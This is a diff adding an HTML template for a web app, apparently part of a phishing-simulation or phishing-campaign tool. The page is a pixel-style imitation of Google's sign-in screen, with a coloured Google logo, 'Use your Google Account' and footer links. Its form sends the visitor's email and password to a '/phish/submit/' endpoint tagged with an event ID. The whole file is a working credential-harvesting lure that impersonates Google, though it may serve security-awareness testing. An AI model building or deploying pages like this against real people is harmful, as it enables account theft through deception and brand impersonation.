@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in – Google Accounts</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: "Google Sans", Roboto, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+
+    .g-card {
+      width: 450px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 48px 40px 36px;
+    }
+
+    .g-logo { text-align: center; margin-bottom: 28px; }
+    .g-logo svg { height: 24px; }
+
+    h1 { font-size: 1.5rem; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
+    .subtitle { font-size: .875rem; color: #202124; text-align: center; margin-bottom: 28px; }
+
+    .form-group { margin-bottom: 20px; position: relative; }
+    .form-group input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 1rem;
+      color: #202124;
+      outline: none;
+    }
+    .form-group input:focus { border-color: #1a73e8; border-width: 2px; }
+    .form-group label {
+      position: absolute; top: -8px; left: 12px;
+      background: #fff; padding: 0 4px;
+      font-size: .75rem; color: #1a73e8;
+    }
+
+    .forgot { font-size: .875rem; color: #1a73e8; text-decoration: none; display: block; margin-bottom: 28px; }
+    .forgot:hover { text-decoration: underline; }
+
+    .actions { display: flex; justify-content: space-between; align-items: center; }
+    .create-account { font-size: .875rem; color: #1a73e8; text-decoration: none; font-weight: 500; }
+    .create-account:hover { text-decoration: underline; }
+
+    .btn-next {
+      background: #1a73e8; color: #fff;
+      border: none; border-radius: 4px;
+      padding: 10px 24px; font-size: .875rem;
+      font-weight: 500; cursor: pointer;
+    }
+    .btn-next:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(0,0,0,.2); }
+
+    .divider { display: flex; align-items: center; gap: 12px; margin: 24px 0; color: #5f6368; font-size: .75rem; }
+    .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dadce0; }
+
+    .footer { margin-top: 24px; display: flex; justify-content: space-between; font-size: .75rem; color: #5f6368; }
+    .footer a { color: #5f6368; text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+    .footer-links { display: flex; gap: 16px; }
+  </style>
+</head>
+<body>
+<div class="g-card">
+  <!-- Google logo -->
+  <div class="g-logo">
+    <svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
+      <text x="0" y="20" font-family="Product Sans,sans-serif" font-size="22" fill="#4285F4">G</text>
+      <text x="14" y="20" font-family="Product Sans,sans-serif" font-size="22" fill="#EA4335">o</text>
+      <text x="27" y="20" font-family="Product Sans,sans-serif" font-size="22" fill="#FBBC05">o</text>
+      <text x="40" y="20" font-family="Product Sans,sans-serif" font-size="22" fill="#4285F4">g</text>
+      <text x="52" y="20" font-family="Product Sans,sans-serif" font-size="22" fill="#34A853">l</text>
+      <text x="59" y="20" font-family="Product Sans,sans-serif" font-size="22" fill="#EA4335">e</text>
+    </svg>
+  </div>
+
+  <h1>Sign in</h1>
+  <p class="subtitle">Use your Google Account</p>
+
+  <form method="POST" action="/phish/submit/">
+    {% csrf_token %}
+    <input type="hidden" name="event_id" value="{{ event_id }}">
+
+    <div class="form-group">
+      <label>Email or phone</label>
+      <input type="email" name="email" required autocomplete="username">
+    </div>
+
+    <div class="form-group">
+      <label>Enter your password</label>
+      <input type="password" name="password" required autocomplete="current-password">
+    </div>
+
+    <a href="#" class="forgot">Forgot email?</a>
+
+    <div style="font-size:.75rem; color:#5f6368; margin-bottom:24px;">
+      Not your computer? Use Guest mode to sign in privately.
+      <a href="#" style="color:#1a73e8; text-decoration:none;">Learn more</a>
+    </div>
+
+    <div class="actions">
+      <a href="#" class="create-account">Create account</a>
+      <button type="submit" class="btn-next">Next</button>
+    </div>
+  </form>
+
+  <div class="footer">
+    <a href="#">English (United States)</a>
+    <div class="footer-links">
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+  </div>
+</div>
+</body>
+</html>
